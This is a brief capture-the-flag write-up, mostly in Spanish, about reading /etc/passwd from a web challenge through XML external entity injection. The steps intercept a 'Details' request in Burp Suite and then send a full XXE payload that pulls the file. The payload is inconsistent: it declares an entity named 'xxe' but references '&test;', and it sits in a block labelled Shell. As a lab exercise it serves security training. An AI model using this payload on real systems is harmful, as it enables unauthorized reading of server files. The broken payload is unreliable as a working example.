# Objetivo

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

# Solucion

-Para resolver este reto tendremos que usar XML entity injection
-encenderemos Burpsuite e interceptaremos el trafico de la pagina una vez dentro
-Con el BurpSuite encendido Daremos click en un boton de "Details"
-Una vez dentro de Burpsuite haremos la inyeccion xml
```Shell
<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <data>
     <ID>
      &test;
     </ID>
  </data>


```
-Le enviamos la peticion y nos dara la bandera :)
# Notas adicionales

# Referencias